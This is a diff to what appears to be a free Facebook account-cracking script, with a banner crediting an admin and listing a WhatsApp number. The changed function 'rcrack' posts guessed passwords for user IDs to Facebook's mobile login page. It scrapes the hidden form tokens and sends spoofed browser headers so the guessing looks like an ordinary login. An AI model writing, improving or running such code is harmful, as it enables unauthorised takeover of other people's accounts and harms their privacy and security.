@@ -160,7 +160,7 @@ logo =                                          """
          \033[1;93m   888   d88P 888 888 888  888 888
           \033[1;95m  8888888P"  888 888 "Y888888 888      
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\n\x1b[1;92m   ADMIN : \x1b[1;97mBILAL DOGAR   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m2.0
+\n\x1b[1;92m   ADMIN : \x1b[1;97mBILAL DOGAR   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m2.3
 
          \x1b[1;92m  WHATSAPP: \x1b[1;95m+923061206565
           \x1b[1;92m FACEBOOK:  \x1b[1;95mBILAL DOGAR
@@ -305,6 +305,25 @@ def rcrack(uid,pwx,tl):
             "sec-fetch-user": '?0',
             "pragma": 'no-cache',
             "priority": 'u=0',
+"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
             'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1',
             "user-agent": pro}
